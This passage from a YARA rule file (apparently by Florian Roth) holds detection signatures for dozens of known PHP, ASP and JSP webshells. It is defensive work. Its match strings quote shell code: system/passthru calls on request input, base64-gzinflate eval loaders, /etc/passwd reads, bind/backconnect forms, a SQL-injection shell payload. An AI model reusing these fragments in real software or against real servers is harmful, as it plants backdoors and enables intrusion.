		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword
	condition:
		2 of them
}
rule WebShell_b374k_php {
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("
	condition:
		3 of them
}
rule WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend {
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
	condition:
		3 of them
}
rule WebShell_h4ntu_shell__powered_by_tsoi_ {
	meta:
		description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
		author = "Florian Roth"
		hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
	strings:
		$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
		$s13 = "$cmd = $_POST['cmd'];" fullword
		$s16 = "$uname = posix_uname( );" fullword
		$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
		$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
		$s20 = "ob_end_clean();" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_MyShell {
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_pws {
	meta:
		description = "PHP Webshells Github Archive - file pws.php"
		author = "Florian Roth"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword
	condition:
		4 of them
}
rule WebShell_reader_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
	condition:
		3 of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		author = "Florian Roth"
		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword
	condition:
		3 of them
}
rule WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
	condition:
		1 of them
}
rule WebShell_php_backdoor {
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
	condition:
		1 of them
}
rule WebShell_Worse_Linux_Shell {
	meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		author = "Florian Roth"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_pHpINJ {
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
	condition:
		1 of them
}
rule WebShell_php_webshells_NGH {
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_matamu {
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword
	condition:
		2 of them
}
rule WebShell_ru24_post_sh {
	meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		author = "Florian Roth"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword
	condition:
		1 of them
}
rule WebShell_hiddens_shell_v1 {
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
	condition:
		all of them
}
rule WebShell_c99_madnet {
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword
	condition:
		all of them
}
rule WebShell_c99_locus7s {
	meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		author = "Florian Roth"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
	condition:
		2 of them
}
rule WebShell_JspWebshell_1_2 {
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword
	condition:
		3 of them
}
rule WebShell_safe0ver {
	meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		author = "Florian Roth"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword
	condition:
		3 of them
}
rule WebShell_Uploader {
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
	condition:
		all of them
}
rule WebShell_php_webshells_kral {
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword
	condition:
		2 of them
}
rule WebShell_cgitelnet {
	meta:
		description = "PHP Webshells Github Archive - file cgitelnet.php"
		author = "Florian Roth"
		hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
	strings:
		$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
		$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
		$s18 = "# in a command line on Windows NT." fullword
		$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
	condition:
		2 of them
}
rule WebShell_simple_backdoor {
	meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		author = "Florian Roth"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword
	condition:
		all of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2 {
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
	condition:
		2 of them
}
rule WebShell_NTDaddy_v1_9 {
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
	condition:
		2 of them
}
rule WebShell_lamashell {
	meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		author = "Florian Roth"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_" fullword
		$s20 = "$curcmd = \"ls -lah\";" fullword
	condition:
		2 of them
}
rule WebShell_Simple_PHP_backdoor_by_DK {
	meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		author = "Florian Roth"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword
	condition:
		2 of them
}
rule WebShell_Moroccan_Spamers_Ma_EditioN_By_GhOsT {
	meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		author = "Florian Roth"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword
	condition:
		all of them
}
rule WebShell_C99madShell_v__2_0_madnet_edition {
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword
	condition:
		all of them
}
rule WebShell_CmdAsp_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	condition:
		4 of them
}
rule WebShell_NCC_Shell {
	meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		author = "Florian Roth"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_README {
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword
	condition:
		all of them
}
rule WebShell_backupsql {
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
	condition:
		2 of them
}
rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version {
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
	condition:
		1 of them
}
rule WebShell_php_webshells_cpanel {
	meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		author = "Florian Roth"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword
	condition:
		2 of them
}
rule WebShell_accept_language {
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
	condition:
		all of them
}
rule WebShell_php_webshells_529 {
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword
	condition:
		2 of them
}
rule WebShell_STNC_WebShell_v0_8 {
	meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		author = "Florian Roth"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
	condition:
		2 of them
}
rule WebShell_php_webshells_tryag {
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
	condition:
		3 of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV_2 {
	meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		author = "Florian Roth"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword
	condition:
		3 of them
}
rule WebShell_qsd_php_backdoor {
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_spygrup {
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword
	condition:
		3 of them
}
rule WebShell_Web_shell__c_ShAnKaR {
	meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		author = "Florian Roth"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
	condition:
		2 of them
}
rule WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz {
	meta:
		description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
		author = "Florian Roth"
		hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
	strings:
		$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
		$s11 = "directory... Trust me - it works :-) */" fullword
		$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
		$s16 = "} else if ($command == 'ls') {" fullword
	condition:
		3 of them
}
rule WebShell_Gamma_Web_Shell {
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_aspydrv {
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword
	condition:
		3 of them
}
rule WebShell_JspWebshell_1_2_2 {
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		author = "Florian Roth"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword
	condition:
		3 of them
}
rule WebShell_g00nshell_v1_3 {
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
	condition:
		2 of them
}
rule WebShell_WinX_Shell {
	meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		author = "Florian Roth"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
